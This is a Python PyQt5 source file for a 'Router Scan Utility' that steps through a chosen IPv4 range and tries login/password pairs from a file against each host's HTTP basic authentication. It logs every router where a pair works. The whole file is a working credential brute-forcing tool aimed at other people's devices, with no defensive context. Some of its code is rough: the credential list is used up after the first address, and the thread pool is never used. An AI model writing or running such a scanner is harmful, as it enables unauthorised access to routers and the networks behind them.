#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import requests
from requests.auth import *
from classes import *
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from multiprocessing.dummy import Pool as ThreadPool


def auth(ip, login, password):
	print("DEBUG: ", ip, login, password)
	try:
		return str(requests.get("http://" + ip, auth=(login, password))) == "<Response [200]>"
	except:
		return None


def f(ip):
    s = '{:02x}{:02x}{:02x}{:02x}'.format(*map(int, ip.split('.')))
    return int(s, 16)
 

def g(n):
    lst = [str((n >> (i * 8)) % 0x100) for i in range(4)]
    return '.'.join(lst[::-1])


def genIPs(start, stop):
	start = f(start)
	stop = f(stop)
	window.progressbar.step = 100 / (stop - start)
	while start <= stop:
		yield g(start)
		start += 1


def scan(event):
	list(map(brute, genIPs(str(window.ip1.text()), str(window.ip2.text()))))



def brute(ip):
	window.append(str(ip))
	for pair in pairs:
		window.progress(None)
		print("DEBUG")
		res = auth(ip, *pair)
		if res:
			print("Found for ip =", ip, ";", *pair, file=fout)
			window.statusbar.showMessage("Found!")
			window.append("Found for " + ip + " " + pair[0] + " " + pair[1])
			return True
		elif res == None:
			return False
	print("Not found for ip =", ip, file=fout)
	return False



class ScanningThread(QThread):
	def __init__(self):
		QThread.__init__(self)

	def run(self):
		pass


app = QApplication(sys.argv)
window = WindowWidget(geometry=(100, 100, 1100, 600), title="JoC Router Scan Utility", icon="rainbow.gif")
window.statusbar.showMessage("Status")
window.scan_button.clicked.connect(scan)

count_of_pools = 10
pool = ThreadPool(count_of_pools)

fout = open("log.txt", 'w')
pairs = map(str.split, open("pairs").readlines())

# scan(None)

app.exec_()

fout.close()